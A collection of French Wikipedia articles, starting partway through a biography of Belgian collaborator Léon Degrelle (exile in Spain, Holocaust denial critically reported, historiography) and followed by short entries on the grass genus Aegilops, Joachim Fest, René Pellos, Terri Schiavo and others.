Après une nouvelle proposition espagnole, qui réitère à peu de chose près les conditions fixées précédemment, mais cette fois sous la forme d'un communiqué commun publié par Bruxelles et Madrid, et qui essuie un nouveau refus de Spaak, De Thier est informé le au matin que Degrelle a reçu un ordre de quitter le territoire et qu'il a été mis en liberté surveillée pour pouvoir s'y conformer. Pour De Thier, les complicités espagnoles dans la disparition de Degrelle ne font pas de doute : Degrelle quitte l'hôpital le à huit heures du matin dans un taxi à bord duquel l'attendent deux passagers, la police locale refuse d'entamer des recherches et le jour même, vers dix heures du soir, les ministères des affaires étrangères et de l'intérieur notifient à la police de Saint-Sébastien que l'affaire est terminée. De nouvelles tentatives pour obtenir l'extradition de Degrelle sont effectuées en 1958, après la mort de son fils, en 1970, et en 1983, à l'initiative du député socialiste Willy Burgeon, mais elles butent sur le fait qu'il a acquis la nationalité espagnole. En marge de ces démarches officielles, il fait l'objet de plusieurs projets de rapatriement de force en Belgique, en 1946, 1958 et 1961, qui ne connaissent jamais le moindre début de concrétisation.
Déchu de sa nationalité belge, Degrelle est naturalisé par adoption en 1954, sous le nom de Léon José de Ramirez Reina. Dès 1947, il fait partie des fondateurs d'une association d'extrême droite, le "Secours international pour les victimes du nazisme", aux côtés d'anciens membres de la Waffen-SS et de la Gestapo. Il réapparaît en public lors d'une cérémonie organisée à la mairie de Madrid en pour la remise de décorations à d'anciens combattants sur le front de l'Est et donne, à la même époque, une interview au journal "El Español". Si aucun élément n'atteste que Degrelle ait quitté l'Espagne entre 1945 et sa mort, on le voit ou l'imagine tour à tour en partance pour l'Argentine, ou réfugié au Portugal ou en Équateur, en Uruguay, en Égypte, voire en séjour en Belgique. Sa naturalisation permet à Degrelle de multiplier les apparitions publiques : en 1962, il marie sa fille aînée, Chantal, en « grand uniforme de fantaisie, arborant ses décorations allemandes » ; en 1970, c'est au tour de sa cadette, Marie-Christine : Degrelle est cette fois en civil mais porte à la boutonnière les insignes de « feuilles de chêne ». Parmi ses familiers se trouve notamment Otto Skorzeny. Dans la nuit du 22 au , Degrelle participe pendant deux heures à la veillée funèbre du corps de Franco, et est ensuite victime d'un malaise cardiaque.
Degrelle se remarie, le avec Jeanne Brevet Charbonneau (1922-2014), la nièce de Joseph Darnand divorcée d'Henry Charbonneau, avec laquelle il vivait depuis plusieurs années et connaît une vie prospère, notamment grâce à l'entreprise de travaux publics qu'il dirige et qui participe à la construction de bases aériennes américaines en Espagne après une tentative infructueuse d'importation de matériel agricole d'Argentine, une société de blanchissage, puis un commerce d'objets d'art.
Dernier dirigeant en vie d'un mouvement pro-nazi d'une certaine importance, il devient une référence pour les mouvements néo-fascistes européens, les partis d'extrême droite et les mouvements intégristes, rôle qu'il cultive avec soin. Il est proche du Front national et est « un admirateur et un ami de son dirigeant, Jean-Marie Le Pen ». Lors d'une émission du "Droit de savoir", sur TF1, le , Le Pen déclare : « je connais Léon Degrelle comme je connais un certain nombre d'hommes politiques mondiaux. [...] C'est un monument de la Seconde Guerre mondiale et un personnage historique tout à fait extraordinaire. Mais c'est un vieux monsieur qui s'attribue une influence qu'il n'a pas. » « Dans toute une série de livres et d'interviews, il tisse autour de ses faits de guerre toute une mythologie, racontant en détail ses relations "privilégiées" avec les dirigeants nazis et se présentant comme l'héritier de la tradition du national-socialisme européen. Les imprécisions historiques des récits historiques de Degrelle ne sont pas difficiles à relever ». Certaines publications de Degrelle suscitent de vifs débats en Belgique. Les deux éditeurs belges de sa "Lettre à Jean-Paul II à propos de Auschwitz" sont condamnés à un et deux ans de prison ferme, et la publication de la série de Wim Dannau, "Ainsi parla Léon Degrelle", entraîne un vif débat à la Chambre où une interdiction est envisagée.
Mort.
Léon Degrelle meurt à l'âge de 87 ans dans la soirée du jeudi à Malaga, à la clinique Parque San Antonio où il avait été admis le en raison d'insuffisance cardiaque. Il est incinéré le lendemain. S'exprimant dans le cadre du documentaire "Degrelle ou la Führer de vivre", Jean Vermeire, ancien officier de la légion Wallonie, déclare qu'il a dispersé les cendres de celui-ci à Berchtesgaden. Ce témoignage n'a pas été remis en cause lors du débat qui a suivi la diffusion du documentaire ou dans la presse.
La construction du mythe.
Dans "La Cohue de 1940", premier ouvrage écrit lors de son exil et publié en Suisse en 1949, Degrelle affirme avoir reçu l'aval du roi pour reprendre ses activités politiques à partir de : « c'est l'opposé qui est vrai. Décidé à récupérer le temps perdu, Degrelle ne cherche aucun conseil avant de plonger dans la mêlée politique ». Pour Charles d'Ydewalle, cet ouvrage « nous fournit, à travers plus de cinq cents pages, le sujet le plus utile à l'œil d'un psychiatre. Tout s'y retrouve depuis la verbosité la plus étincelante jusqu'à la platitude la plus sordide, en passant par des accès de mégalomanie qui, répétons-le, méritent l'étude avertie d'un spécialiste. […] Degrelle ne manque jamais l'occasion de se mettre à la tribune sur le même plan qu'Adolf Hitler, Benito Mussolini et Francisco Franco. Sa pathologie est ici éminemment intéressante. » Du même auteur, proche de Degrelle au début des années trente, à propos de "La campagne de Russie", deuxième ouvrage d'exil publié lui aussi en 1949 : « Degrelle fait du roman. Son pouvoir d'affabulation est tel qu'il peut raconter n'importe quoi à n'importe qui ». Et d'Ydewalle de poursuivre en soulignant que le livre est dédié aux de la légion Wallonie, qui d'après les rapports allemands a compté ou disparus et évacués du front.
"Hitler pour mille ans", publié en 1969, est tout aussi révélateur des affabulations de Degrelle et de son admiration persistante pour Hitler. Pour le premier aspect, Degrelle affirme tour à tour qu'après sa première entrevue avec Hitler en 1936, celui-ci aurait dit et répété à Joachim von Ribbentrop qu'il n'avait jamais vu de tels dons chez un gars de cet âge, qu'en 1939, le soir, il allait parfois retrouver le roi Léopold à son palais de Laeken, « où le souverain le recevait détendu, en culotte de cheval » et où ils jetaient « ensemble les bases des campagnes de la presse rexiste » ; toujours selon Degrelle, en préparation à l'invasion de la Norvège, « Hitler lui-même avait été auparavant rôder secrètement en bateau tout au long de la côte à investir et connaissait chaque crique du débarquement. » Bien qu'il n'ait rencontré Hitler qu'à trois reprises, il proclame « : Moi je l'ai connu tout au long de ces dix années, connu de tout près au moment de sa gloire, comme au moment où, autour de lui, l'univers de ses œuvres et de ses rêves basculait. Je sais. Je sais qui il était : le chef politique, le chef de guerre, l'homme, l'homme tout cru, l'homme tout court. » Quant au second aspect, Degrelle nie la Shoah tout en exaltant les réalisations du nazisme : « On a publié, dans un gigantesque tapage, cent reportages, souvent exagérés, parfois grossièrement mensongers, sur les camps de concentration et les fours crématoires, seuls éléments que l'on veuille bien mentionner dans l'immense création que fut, pendant dix ans, le régime hitlérien. » Il termine son ouvrage en écrivant « qu'il est malheureux qu'au Hitler ait raté l'affaire [l'unification de l'Europe] à son tour [après Napoléon]. Le communisme eût été balayé » et que « Hitler disparu, le monde démocratique s'est révélé incapable de créer du neuf dans le domaine politique et social, ou même de rafistoler du vieux », allant jusqu'à prétendre que Hitler a inspiré Nasser, de Gaulle, Tito et Castro.
Jusqu'à son dernier souffle, Léon Degrelle exalte les réalisations d'Hitler et du régime national-socialiste. Il s'inscrit en outre dans la mouvance négationniste, niant en particulier l'existence et la matérialité de l'holocauste, notamment dans sa "Lettre à Jean-Paul à propos de Auschwitz", publiée en 1979. « Hormis une tendance grandissante à la mégalomanie et l'auto-glorification, son discours reste le même depuis 1945. Le tempérament de Léon Degrelle, le tempérament de celui qui a raison, qui a toujours raison, qui a raison tout seul, sa tendance – quel faible mot à en rajouter systématiquement, toujours et dans tout, voilà qui fait de ses déclarations, affirmations ou dénégations un buisson d'épines dont il est bien malaisé de faire un fagot ; le temps, mais encore plus la répétition, enjolive les histoires, les dépouille souvent de leurs aspects désagréables et gênants. » Pour Marc Magain, en Espagne, Degrelle « s'exercera parallèlement à une activité littéraire abondante, à peaufiner de lui-même une image où l'histoire, la légende et le désir de justification se conjuguent et souvent se contredisent, au grand dam de ceux qui cherchent à retracer et à découvrir la réalité ».
Comme le précise José Gotovitch, à l'époque directeur du Centre d'études et de recherches historiques de la Seconde Guerre mondiale et professeur à l'Université libre de Bruxelles, dans sa préface à l'ouvrage de Martin Conway, « s'est construit le mythe Degrelle, dont l'une des expressions les plus grotesques fut bien celle qui attribuait le prétendu refus belge de son extradition à la peur des révélations qu'il tenait en réserve. Or s'il est un mythe Degrelle […] c'est précisément le mythe de son importance, de son poids dans l'histoire de la Seconde Guerre mondiale en Belgique ».
L'homme et le tribun.
Le , Léon Degrelle épouse Marie-Paule Lemay, de cinq ans sa cadette, d'origine française et appartenant à la bonne bourgeoisie tournaisienne, avec qui il a cinq enfants : Chantal (1934), Anne (1936), Godelieve (1938), Léon-Marie (1939) et Marie-Christine (1944). Le mariage est célébré par Louis Picard, et sur le faire-part, Degrelle s'y présente comme docteur en droit.
En 1943, . On attribue à cette époque à Degrelle un certain nombre de maîtresses à Berlin, à Paris et à Bruxelles, alors que sa femme entretient une liaison avec un officier de la Luftwaffe, le "Sonderführer" Hellmuth Pessl, qui meurt dans des circonstances peu claires Toujours en 1943, Degrelle crée une nouvelle publication "L'Avenir", qui connaît un succès populaire et financier : en 1944, "L'Avenir" réalise un bénéfice mensuel de , . Grâce également à la richesse de sa belle-famille, .
Après la guerre, son épouse est condamnée à dix ans de prison et en purge cinq. Lors de son procès, elle déclare que . Après sa libération, elle décide de ne pas rejoindre son mari en Espagne. Elle meurt à Nice, le , sans jamais avoir revu son époux depuis 1945.
Généralement souriant, Degrelle plaît aux femmes, chaleureux, il : le , prisonnier à Cholet, il est sauvé du lynchage par onze détenus communistes. Il fait preuve d'un réel courage physique, tant dans les années 1930 durant lesquelles à différentes reprises, il sera ramené sur une civière de réunions où il était allé porter la contradiction, que pendant la guerre sur le front de l'Est. Il est surtout un orateur exceptionnel, capable d'enflammer son auditoire. , à l'exception de Paul-Henri Spaak. Il traite tour à tour le cardinal van Roey d'« anthropophage » et de « troglodyte ensoutané », le sénateur Philips de « requin d'argent pourri jusqu'aux métacarpes », le ministre du Bus de Warnaffe de « Gugusse de Warnaffe » et de « cagot débile », le premier ministre van Zeeland de « pillard larmoyant » et Winston Churchill de « débris bruyant ». Comme le souligne M. Conway, .
Le courage de Degrelle sur le front est souligné par Jean-Marie Frérotte et par Eddy de Bruyne. .
Historiographie.
Degrelle suscite déjà de nombreuses publications en 1936 et 1937, qui émanent de ses partisans ou de ses adversaires et sont rédigées sur un ton hagiographique ou polémique. Pour le député rexiste Pierre Daye, « Léon Degrelle a un talent d'orateur prestigieux, un remarquable talent d'écrivain, un équilibre des nerfs magnifique, le sens du commandement, de l'organisation, l'autorité naturelle du chef. » Robert Brasillach est totalement séduit : « Peut-on résister à Léon Degrelle, à sa présence, à sa camaraderie immédiate, au rire d'enfant qui s'empare de lui ? […] Tout de suite, auprès de lui, on est saisi de cette confiance qui fait l'agrément juvénile du rexisme, on croit tout ce qu'il dit, tout ce qu'il va dire. […] Degrelle a cette jonction supérieure de son esprit et de son sang à l'esprit et au sang d'une époque, sans laquelle il n'est peut-être pas de meneur d'hommes. » Le portrait dressé en 1936 par Robert du Bois de Vroylande, jusqu'alors rédacteur en chef de la société d'édition REX et qui venait de rompre avec le rexisme, est d'une toute autre nature : « Du talent ? Oui si on appelle talent l'art de gueuler, les poings sur les hanches, comme au marché aux poissons, de faire passer des limandes pour des soles, les adversaires pour des requins et un pauvre type pour une sorte de génie. […] De la franchise ? Oui, si l'homme franc affirme blanc aujourd'hui et noir demain. De l'attachement à ses principes ? Oui, si l'attachement à ses principes est dans le fait de les piétiner chaque jour. De l'idéal ? Oui, si c'est en avoir que d'en changer comme de chemise
Il n'existe pas de bibliographie complète de Léon Degrelle répondant aux critères des historiens de métier, à l'exception de celle contenue dans la biographie résumée d'Alain Colignon publiée dans "La Nouvelle Biographie nationale". Pour les années trente, l'ouvrage fondateur est celui de Jean-Michel Étienne, "Le Mouvement rexiste jusqu'en 1940", relativement peu connu en dehors des milieux universitaires. Pour la période de la collaboration, les ouvrages de Martin Conway sont fondamentaux : « La première étude impartiale et systématique de la collaboration de Léon Degrelle et des rexistes avec l'occupant nazi de 1940 à 1945 vient seulement de paraître et on la doit à un Anglais ! […] Un ouvrage capital et captivant. » La traduction de cet ouvrage en néerlandais, contemporaine de celle en français, est saluée par le "Vlaams Nationaal Weekblad" : « C'est une étude solide et sérieuse, la première qui traite le sujet de manière approfondie et avec un souci d'objectivité et qui donc comble une lacune. »
Le livre de Pol Vandromme, "Le Loup au cou de chien : Degrelle au service de Hitler", fait l'objet d'une large couverture dans la presse belge, qui souligne son caractère salutaire mais aussi son ton pamphlétaire et son manque de documentation. Fondé sur plus de 150 témoignages et sur plusieurs entretiens avec Degrelle, le livre de Jean-Marie Frérotte, "Léon Degrelle, le dernier fasciste", qui couvre toute la vie de Degrelle, est favorablement accueilli par la presse belge, malgré l'absence d'appareil critique et de mention des sources.
Degrelle apparaît pour la première fois à la télévision belge dans le cadre de la série "L'ordre nouveau" de Maurice De Wilde, diffusée par la BRT, chaîne publique flamande, en 1981. Cette émission brise à la fois un tabou sur la collaboration en Belgique et sur le fait de diffuser une interview de Degrelle à la télévision nationale. Cette interview est critiquée dans son principe avant même sa diffusion. Léon Degrelle est longuement interviewé par des journalistes de la RTBF en 1977, en préparation d'une émission en cinq épisodes, dont la diffusion est prévue pour 1978. Le conseil d'administration de l'institution télévisuelle décide de reporter le projet considérant que l'impact de Degrelle, malgré les critiques des historiens, était encore trop fort. La série prévue en 1978 est finalement ramenée à trois épisodes et diffusée du 17 au , chaque épisode étant suivi d'un débat. Elle suscite des réactions diverses, dont de violentes critiques qui estiment qu'on a offert une véritable tribune au symbole de la collaboration francophone en Belgique.
Le , la RTBF diffuse un nouveau documentaire de , "Degrelle ou la Führer de vivre", qui rencontre un réel succès d'audience, avec pour le documentaire et le débat qui lui fait suite. Son auteur est l'historien français Korenthin Falc'hun, dont les travaux de thèse de doctorat ont servi de base au film, et sa réalisation est dirigée par Philippe Dutilleul, journaliste belge réputé pour son ton avant-gardiste et décalé et dont plusieurs émissions ont suscité de vifs débats en Belgique francophone.
Même s'il fait l'objet de polémiques, ce documentaire « décoiffe » et brise un tabou.
À la différence de ses prédécesseurs, le film ne fait appel ni à la « voix off », ni aux commentaires d'historiens ou de spécialistes, le choix étant de « privilégier l'intelligence des gens ». En s'appuyant sur de nombreuses archives inédites, ce documentaire délivre de nouveaux éléments biographiques, particulièrement en ce qui concerne l'exil espagnol, en présentant les témoignages « bruts » de personnes ayant connu Degrelle. « Dénué de commentaire et d'éclairages historiques, volontairement truffé de zones d'ombres, ce long portrait parcellaire et impressionniste laisse ainsi s'épanouir, pour mieux la dénoncer, la folie mégalomaniaque de ce symbole du fascisme européen, qui, après sa condamnation à mort par contumace, coula des jours paisibles en Espagne jusqu'en 1994. »

</doc>
<doc id="249081" url="https://fr.wikipedia.org/wiki?curid=249081" title="Égilope">
Égilope

Aegilops, l’Égilope, est un genre de plantes monocotylédones de la famille des "Poaceae", sous-famille des "Pooideae", originaire du bassin méditerranéen et d'Asie occidentale.
Le genre comprend une vingtaine d'espèces. Ce sont des plantes herbacées annuelles, rhizomateuses ou cespiteuses, atteignant de 15 à 80 cm de haut.
Dans les années 1950, la conscience croissante de la similarité génétique (y inclus certains génomes partagés) des égilopes sauvages conduisit certains botanistes à fusionner "Aegilops" et "Triticum" en un genre unique, "Triticum". Cette approche est parfois encore suivie (par des généticiens principalement), mais n’a pas été largement adoptée par les taxonomistes. Les "Aegilops" sont morphologiquement très distincts des "Triticum", avec des glumes arrondies plutôt que carénées.
Hybridation.
Les espèces du genre "Aegilops" peuvent s'hybrider avec des espèces des genres "Triticum" ("× Aegilotriticum" Wagner ex Tschermak), "Secale" ("× Aegilosecale" Ciferri &amp; Giacom.), "Dasypyrum", "Elytrigia".
Le genre "Aegilops" est important dans l’évolution du blé pour son rôle dans deux événements d’hybridation importants. L’engrain sauvage ("Triticum dicoccoides" et "Triticum araraticum") est le résultat de l’hybridation d’un blé sauvage, "Triticum urartu", et d’une égilope encore non identifiée, probablement similaire à "Aegilops speltoides". Le genre "Aegilops" a également été utilisé pour transférer par des techniques de transgénèse et d'hybridation, des fragments chromosomiques de résistance à plusieurs maladies, dont la rouille brune du blé et l'oïdium du blé, au blé tendre pour créer la variété de blé tendre d'hiver « Renan ».
Liste des espèces, sous-espèces et variétés.
Selon :
Importance économique.
Sur le plan économique, plusieurs espèces d"'Aegilops" sont d'importantes mauvaises herbes des cultures, notamment "Aegilops cylindrica", "Aegilops geniculata", "Aegilops triuncialis".
Certaines espèces sont des plantes fourragères utiles dans les pâturages, par exemple "Aegilops cylindrica", "Aegilops kotschyi", "Aegilops triuncialis".

</doc>
<doc id="249082" url="https://fr.wikipedia.org/wiki?curid=249082" title="Joachim Fest">
Joachim Fest

Joachim Fest, né le à Berlin-Karlshorst et mort le à Kronberg im Taunus, est un historien, éditeur, écrivain et journaliste allemand.
Spécialiste du Troisième Reich, il publie en 1973 une biographie d'Adolf Hitler intitulée "le Führer", traduite en plus de vingt langues.
Biographie.
Joachim Fest est issu d'une famille de la bourgeoisie catholique et conservatrice allemande qui ne s'est pas compromise avec le régime des nazis. Il lui rend hommage dans son autobiographie posthume "Ich nicht" ("Pas moi").
En , à l'âge de 18 ans, il s'engage dans l'armée allemande pour éviter d'être incorporé dans les Waffen SS. Il est rapidement fait prisonnier de guerre en France.
Joachim Fest étudie le droit, l'histoire et la littérature allemande. En 1963, il devient rédacteur en chef de la chaîne NDR et publie un ouvrage sur les protagonistes du régime nazi, "Les Maîtres du Reich - Figures d'un régime totalitaire".
De 1973 à 1993, il est chroniqueur au "Frankfurter Allgemeine Zeitung". En 1973, il publie "Le Führer", qui provoque de vives polémiques parmi les historiens. Il poursuit son exploration du Troisième Reich en écrivant notamment "Le coup d'État. Le long chemin vers le " en 1994 et "Speer, biographie du ministre de l'armement et de l'architecte particulier d'Hitler", en 1999.
Membre du directoire du journal conservateur "Frankfurter Allgemeine Zeitung", figure du milieu intellectuel allemand, il s'opposait souvent à la gauche allemande qu'il jugeait moralisatrice refusant la diabolisation comme outil de culpabilisation. Il paraissait être l'antithèse du romancier Günter Grass.
En 2002, son ouvrage "Les Derniers Jours d'Hitler" devient rapidement un best-seller. Il y décrit le chapitre ultime de la guerre, la bataille de Berlin et le suicide d'Hitler dans le bunker de la Chancellerie. Ce livre inspire par la suite le film "La Chute", sorti en 2004.

</doc>
<doc id="249083" url="https://fr.wikipedia.org/wiki?curid=249083" title="Brundtland">
Brundtland

Brundtland peut aussi désigner :

</doc>
<doc id="249084" url="https://fr.wikipedia.org/wiki?curid=249084" title="Christian Fjerdingstad">
Christian Fjerdingstad

Christian Fjerdingstad (1891-1968) est un orfèvre danois.
Biographie.
Carrière professionnelle.
En 1925, Fjerdingstad travaille comme responsable de la création dans la célèbre maison d'orfèvrerie Christofle pour ses pièces en métal argenté ou en étain vendues sous le nom d"'Étain de Carville", traduction littérale de son nom danois Fjerding-Stad. Cet artiste danois considéré comme le rénovateur de l'orfèvrerie au et l'un des fondateurs du style Art déco dans ce domaine. Sa passion pour l'ornithologie et la botanique apporte une veine naturaliste, organique et fluide servie par une technique où les qualités du métal sont largement exploitées notamment dans le martelage.
Christian Fjerdingstad est l'auteur de "Escapade dans le passé ou la vie d'un Danois en France" - édition du Rocher, 1967.
Une exposition lui est consacrée entre mai et au Musée d'art et d'histoire Louis-Senlecq de L’Isle-Adam, France et au Museet paa Koldinghus de Kolding, Danemark en 1999.

</doc>
<doc id="249086" url="https://fr.wikipedia.org/wiki?curid=249086" title="Dick Higgins">
Dick Higgins

Dick Higgins (1938-1998) est un écrivain et artiste américain.
Biographie.
Américain d'adoption, Dick Higgins est né le à Cambridge en Angleterre. Poète, compositeur, écrivain, il est actif dans le champ de l'art depuis 1957. Il étudie avec John Cage et Henry Cowell. Il épouse l'artiste Alison Knowles en . Après avoir participé à l'élaboration des premiers happenings en 1958, il cofonde Fluxus dès 1961. En 1963 il fonde les éditions Something Else Press et réalise une quantité considérable de publications sur les artistes de cette période et introduit en 1965 dans un essai le célèbre concept d'Intermedia qu'il oppose à celui de "Mixed Media". Dès 1966, il produit la première exposition de poésie concrète aux États-Unis et donne performances, lectures, concerts, et enseignements divers en Europe et aux États-Unis. Ses œuvres visuelles ont été montrées dans diverses expositions personnelles et collectives dans le monde entier. Ses textes sont publiés dans de nombreuses revues et il produit aussi quantité de disques, films et vidéos. Expérimentateur infatigable, il aura essayé les moyens d'expression les plus variés. Ses études sur les différentes formes de poésie visuelle seront couronnées de succès avec son livre "Pattern Poetry" (1987). Sa dernière intervention théorique a lieu pendant le Colloque d'Art Action à Québec, où il meurt pendant la nuit du 25 au , emporté par une crise cardiaque.

</doc>
<doc id="249087" url="https://fr.wikipedia.org/wiki?curid=249087" title="Dick higgins">
Dick higgins



</doc>
<doc id="249088" url="https://fr.wikipedia.org/wiki?curid=249088" title="Canche">
Canche

Plantes.
Les canches sont des plantes de la famille des "Poaceae", appartenant aux genres "Aira", "Corynephorus" ou "Deschampsia," avec notamment :

</doc>
<doc id="249089" url="https://fr.wikipedia.org/wiki?curid=249089" title="Wilhelm Gottlieb von Tilesius von Tilenau">
Wilhelm Gottlieb von Tilesius von Tilenau

Wilhelm Gottlieb von Tilesius von Tilenau est un médecin, un naturaliste et un explorateur prussien, né le à Mühlhausen et mort le dans cette même ville.
Biographie.
Il obtient son titre de docteur à Leipzig en 1801. Il fait paraître "Musæ paradisiacæ icones" en 1792 et d'autres publications naturalistes qui le font connaître du monde savant. Il fait paraître en 1802, "" sur les maladies comme le dartre.
En 1803, il se rend à Saint-Pétersbourg et fait un voyage autour du monde comme naturaliste sous les ordres du capitaine Adam Johann von Krusenstern (1770-1840), la première circumnavigation russe. Il revient à Saint-Pétersbourg en 1808. Il fait paraître le compte rendu de son voyage en 1813.
Il s'installe après à Mühlhausen, à Dresde en 1825 et à Leipzig en 1830.
Parmi ses autres publications, citons "Naturhistorische Früchte der... Erdumsegelung" (1813), "Über die Cholera" (1830-1831).
Il collabore à "Zoographia rosso-asiatica" de Peter Simon Pallas (1741-1811) dont il assure la parution du quatrième volume.

</doc>
<doc id="249099" url="https://fr.wikipedia.org/wiki?curid=249099" title="René Pellos">
René Pellos

René Pellos, né René Marcel Pellarin le à Lyon et mort le à Cannes, est un scénariste et dessinateur de bande dessinée français.
Biographie.
De parents savoyards, le jeune René Pellarin, futur Pellos, naît dans le premier arrondissement de Lyon, le . Ses parents tentent de lui faire suivre une formation à l'école des Beaux-Arts de Genève qu'il quitte en claquant la porte dès la première leçon. Pellos n'aura donc appris son métier que « sur le tas ». Son « coup de patte » lui permet d'entrer à l'âge de 16 ans comme dessinateur de presse dans un journal satirique genevois : "Guguss"', revue de Louis Bron, célèbre pour son engagement contre la prohibition de l'absinthe, puis dans d'autres journaux régionaux.
Parallèlement, il pratique le hockey sur gazon et, à l'âge de 16 ans, avec des camarades collégiens, il fonde le club de Varembé. Par la suite et durant une dizaine d'années, il est un des piliers de la première équipe du Servette Hockey Club de Genève. Ses qualités de centre-demi lui valent d'être sélectionné pour le premier match international de l'équipe suisse, en 1922, puis pour les Jeux Olympiques d'Amsterdam, en 1928. Il pratiqua également le football, le rugby à XV, la boxe et collabore à des journaux sportifs. C'est dans cet esprit qu'au milieu des années 50, il a livré une bande dessinée sportive, "Rock Gérard", au journal "IMA, l'ami des jeunes".
En 1930, il s'installe à Paris et commence sa carrière dans des périodiques tant généralistes que spécialisés dans le sport. Ses travaux en tant qu'illustrateur sportif, publiés dans de nombreux périodiques, sont . Rapidement adopté par le public, il lui est proposé de suivre le Tour de France, dont il devient le dessinateur de presse et caricaturiste fétiche pendant de nombreuses années. La carrière de Pellos est prolifique en bandes dessinées et, même s'il ne s'agit pas de son œuvre majeure, sa production d'une centaine d'albums des "Pieds Nickelés" (série de bande dessinée créée par Louis Forton) en 30 ans, après la Seconde Guerre mondiale, marque l'univers de la BD. Pellos la reprend à partir de 1948 et poursuit jusqu'en 1981. Moins connu, mais sans doute plus original, il révolutionne le style science-fiction avec "Futuropolis", une bande dessinée d'anticipation parue dans "Junior" de 1937 à 1938, dans laquelle il multiplie les audaces esthétiques. Il propose également de nombreuses créations dans des périodiques pour la jeunesse.
Veuf depuis 1984, Pellos est décédé le 8 avril 1998 à Cannes à l'âge de 98 ans, alors qu'il était le doyen des dessinateurs de bandes dessinées français.
Presse sportive et livres pour enfants.
Ses caricatures sur le Tour de France lui valent une véritable notoriété. Ses montagnes prennent visage humain, rient, s'étonnent ou deviennent menaçantes au passage des coureurs grimaçant sous l'effort. Il croque pendant des années les vedettes du peloton mais aussi les obscurs, les porteurs d'eau, pour des titres comme "Miroir du Cyclisme", "Miroir Sprint" ou "Sport Mondial". Antonin Magne, Fausto Coppi, Federico Bahamontes, Jacques Anquetil, Eddy Merckx et bien d'autres sont immortalisés sur le papier, souvent grimaçant sous l'effort ou s'envolant dans les cols.
La montagne.
Passionné de montagne, il passe près de la moitié de sa vie près du Mont Blanc, à Saint-Gervais-les-Bains. Il l'illustre en couleurs, dans des livres pour enfants de Philippe Gaussot parus vers 1946 chez l'éditeur Jean Landru à Chamonix : "You-pi le chamois", et "Hoppy la marmotte"."Tschirb le choucas", annoncé, n'est cependant jamais paru. Il illustre notamment deux romans d'Herman Grégoire : "Mademoiselle Hortense dans les grottes" et "le Parapluie de Mademoiselle Hortense". Le premier aux éditions Régrier, Chavany et Cie en 1946, le dernier aux éditions Archat en 1945. Un autre titre du même personnage, "Les aventures de Mademoiselle Hortense", est illustré quant à lui par Roger Sam en 1944 chez Archat.

</doc>
<doc id="249103" url="https://fr.wikipedia.org/wiki?curid=249103" title="Terri Schiavo">
Terri Schiavo

Terri Schiavo (née Theresa Marie Schindler le - ) est une Américaine, figure emblématique de la polémique sur l'euthanasie. Son cas a fait plusieurs fois la une de la presse aux États-Unis à la suite des poursuites judiciaires entamées par ses parents pour la maintenir en vie malgré l'avis des médecins.
Elle fut victime d'un arrêt cardiaque prolongé, à la suite d'une hypokaliémie (chute du taux de potassium) due à des vomissements répétés et excessifs (elle était boulimique). Cet arrêt cardiaque a engendré de graves lésions cérébrales irréversibles. En 1991, soit 14 ans avant sa mort, elle était considérée par les médecins comme ayant sombré dans un état végétatif permanent et donc irréversible, bien qu'elle fût capable de certains mouvements et d'expressions du visage. 
En 1998, son ex-mari Michael Schiavo fit la demande légale que l'on cesse de la nourrir. Ses parents, Robert et Mary Schindler, s'y opposèrent et entamèrent une longue procédure judiciaire visant à maintenir leur fille en vie. Ils ont été déboutés, tant par la justice de Floride que par la justice fédérale qui estima que Terri n'aurait pas souhaité continuer à vivre de cette façon, malgré une intervention controversée du Congrès à l'initiative du président américain George W. Bush qui visait à la maintenir en vie.
Elle meurt le , après que le cathéter qui la nourrissait a finalement été débranché.
L'épisode "Potes pour la vie" de la série "South Park" diffusé la veille de la mort de Terri Schiavo parodie l'événement.

</doc>
<doc id="249104" url="https://fr.wikipedia.org/wiki?curid=249104" title="Aira">
Aira

Le genre Aira regroupe des plantes herbacées de la famille des "Poaceae" (graminées). Il comprend quelques espèces des régions tempérées et froides.
Ces plantes sont souvent appelées des canches.
De nombreuses espèces rangées précédemment dans ce genre ont été reclassées dans les genres voisins "Deschampsia" et "Koeleria".
"Aira" dérive d'un mot grec qui désignait une graminée.
Principales espèces.
Selon :

</doc>
<doc id="249106" url="https://fr.wikipedia.org/wiki?curid=249106" title="Clef allen">
Clef allen



</doc>
<doc id="249108" url="https://fr.wikipedia.org/wiki?curid=249108" title="Joseph Oberthur">
Joseph Oberthur

Joseph Marie Oberthur, dit Joseph Oberthur, né le à Rennes, mort le à Cancale, est un peintre, dessinateur animalier et écrivain cynégétique français. 
Il est le fils de l’imprimeur Charles Oberthür.
Biographie.
Le nom et l’œuvre du Docteur Joseph Oberthur demeurent bien connus des naturalistes, même en dehors de la France. Si dans la presse, on l’a de son vivant surnommé , en raison de sa connaissance scientifique de la faune sauvage, on a autant vanté le style alerte de ses livres que le charme de ses dessins pour leur exactitude.
Il finit sa vie à Cancale dans la propriété de la Broustière qu’il a hérité de son grand-père François-Charles Oberthür
Ouvrages.
Les numéros ISBN de ces ouvrages correspondent à des rééditions.
Hommage et distinction.
Il obtient le croix de guerre 1914-1918 puis la légion d'honneur pour son service en tant que médecin du RI puis médecin-major de .
En 1954, il obtient la grande médaille de Geoffroy Saint-Hilaire de la société d’acclimatation de France.

</doc>
<doc id="249109" url="https://fr.wikipedia.org/wiki?curid=249109" title="Débogage">
Débogage



</doc>
<doc id="249110" url="https://fr.wikipedia.org/wiki?curid=249110" title="Marie Waleska">
Marie Waleska



</doc>
<doc id="249118" url="https://fr.wikipedia.org/wiki?curid=249118" title="Alexandre de Médicis (1510-1537)">
Alexandre de Médicis (1510-1537)

Alexandre de Médicis (Alessandro de' Medici en italien), dit Alexandre le Maure (il Moro en italien) (né à Florence le - mort à Florence le ), est duc de Penne puis seigneur de Florence à partir de 1530, duc de Florence de 1532 à 1537. Bien qu'enfant illégitime, il est le dernier descendant de la branche principale des Médicis à gouverner Florence et le premier duc héréditaire de la République florentine.
Biographie.
Alexandre est le fils illégitime du jeune Laurent II de Médicis, plus tard père de Catherine de Médicis, et donc un arrière-petit-fils de Laurent le Magnifique. Mais pour beaucoup, il pourrait être le fils naturel du cardinal Jules de Médicis, neveu de Laurent, qui deviendra, plus tard, le pape Clément VII.
En raison de la couleur de sa peau, il reçoit comme surnom « Le Maure ». Des historiens (tels que Christopher Hibbert) pensent que sa mère était une servante « mulâtresse » de la famille des Médicis identifiée dans les documents comme (Collevecchio en Sabine). D'autres sources indiquent que sa mère est une paysanne de la campagne romaine. Cependant, Jean Nestor écrivit en 1560 que cette ascendance mauresque était une rumeur répandue par les ennemis d'Alessandro exilés à Naples.
